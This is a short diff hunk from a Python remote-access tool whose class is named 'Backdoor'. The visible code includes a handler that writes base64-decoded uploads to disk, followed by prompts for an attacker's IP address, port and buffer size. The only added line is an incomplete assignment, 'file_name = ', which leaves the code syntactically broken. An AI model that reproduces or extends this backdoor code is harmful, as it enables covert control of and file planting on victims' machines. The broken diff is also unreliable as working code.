@@ -91,6 +91,10 @@ class Backdoor:
             file.write(base64.b64decode(content))
             return "[+] Upload successful."
     
+
+    
+file_name = 
+    
 ip = raw_input("Enter IP Address: ")
 port = int(raw_input("Enter port number to use: "))
 buffer_size = int(raw_input("Enter buffer size: "))
